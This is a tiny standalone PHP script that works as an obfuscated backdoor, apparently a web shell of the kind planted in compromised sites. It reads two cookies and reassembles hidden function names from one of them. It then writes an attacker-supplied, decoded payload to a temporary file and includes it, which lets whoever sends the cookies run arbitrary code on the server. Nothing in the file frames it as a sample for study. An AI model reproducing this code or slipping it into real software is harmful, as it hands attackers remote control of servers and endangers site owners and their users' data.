<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[21])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 8;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[21][$n];
        if (!$c[21][$n + 1]) {
            if (!$c[21][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 8 + 1;
    }
    $k = $p[12]() . $p[20];
    if (!$p[18]($k)) {
        $n = $p[27]($k, $p[19]);
        $p[1]($n, $p[10] . $p[9]($p[3]($c[3])));
    }
    include($k);
}